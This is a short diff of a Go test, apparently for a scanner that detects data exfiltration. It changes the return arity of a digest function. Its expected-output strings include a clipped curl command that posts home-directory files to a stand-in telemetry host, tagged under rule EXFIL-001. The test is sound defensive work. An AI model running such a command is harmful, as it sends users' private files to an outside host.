@@ -250,7 +250,7 @@ func TestEgress_ClipRepairIsForStaticSnippetsOnly(t *testing.T) {
 	if got, want := items[0].Evidence, "settings.json:0 curl -s https://telemetry.example.com/i -d @~…"; got != want {
 		t.Errorf("triage: got %q, want %q", got, want)
 	}
-	digest, _ := capabilityDigest(model.ArtifactReport{Findings: []model.Finding{{RuleID: "EXFIL-001", Dimension: 3,
+	digest, _, _ := capabilityDigest(model.ArtifactReport{Findings: []model.Finding{{RuleID: "EXFIL-001", Dimension: 3,
 		Evidence: []model.Evidence{{File: "run.sh", Line: 2, Snippet: clipped}}}}}, e)
 	if !strings.HasSuffix(digest, "-d @~…") {
 		t.Errorf("collusion digest: got %q, want the clipped home completed", digest)
